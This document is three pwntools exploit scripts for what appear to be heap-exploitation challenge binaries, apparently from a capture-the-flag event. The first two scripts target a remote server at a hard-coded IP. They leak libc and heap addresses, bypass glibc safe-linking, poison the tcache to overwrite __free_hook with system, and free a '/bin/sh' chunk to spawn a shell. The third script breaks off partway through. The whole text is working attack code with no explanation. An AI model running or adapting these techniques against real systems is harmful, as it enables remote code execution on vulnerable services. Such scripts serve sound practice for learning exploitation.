from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
# binaryname = "./spaghetti"
# p=process(binaryname)
p=remote("207.154.239.148", 1369)
# p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)

malloc(0, 0x24)
malloc(1, 0x24)
malloc(2, 0x421)
malloc(3, 0x24)

free(2)

leak = u64(view(2).split(b'\n')[7].split(b" ")[1].ljust(8, b"\x00"))
free(0)
free(1)
edit(3, "/bin/sh") # jon snow
libc=ELF("./libc.so.6")
offset = 0x1ecbe0
base = leak - offset
libc.address = base
free_hook = libc.sym["__free_hook"]
log.info(hex(free_hook))
edit(1, p64(free_hook))
malloc(4, 0x24)
malloc(5, 0x24)
edit(5, p64(libc.sym["system"]))
free(3)

#Level 2 Script
from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
binaryname = "./encrypted"
# p=process(binaryname)
e = ELF("./libc.so.6")
p=remote("207.154.239.148", 1370)
# p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def read_leak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)
def encrypt(target, heapbase):
    return target ^ (heapbase >> 12)

malloc(0, 0x418)
malloc(1, 0x24) # jon
malloc(2, 0x24)
free(0)
free(1)
malloc(3, 0x428)
glibc_leak = read_leak(view(0))
heap_leak = read_leak(view(1))
forever_offset = 0x1e3ff0

log.info(f'Glibc Leak = {hex(glibc_leak)}')
log.info(f'Heap leak = {hex(heap_leak)}')

glibc_base = glibc_leak - forever_offset
e.address = glibc_base

free_hook = e.sym['__free_hook']
system_ = e.sym['system']

free(2)
edit(2, p64(free_hook ^ heap_leak))
malloc(3, 0x24)
malloc(4, 0x24) # FREE_HOOK
edit(4, p64(system_))
malloc(5, 0x24)
edit(5, b'/bin/sh')
free(5)

#Level 3 Script
from pwn import *

p = process("./free_a")

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# encrypt a function pointer
def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))

# def WWW(target, payload, key):
#     edit(11, b"Z"*(16*16 + 8) + p64(0x111) + p64((target) ^ key))#NOTE the key should be pre-shifted
#     malloc(8, 0x108)
#     malloc(13, 0x108)
#     edit(13, payload)#NOTE you're in charge of stringifying your payload p64 style or whatever
#     free(8)#this presets the next WWW

malloc(0, 0x418)
malloc(1, 0x18)
free(0)
free(1)
malloc(2, 0x18)
response = view(2)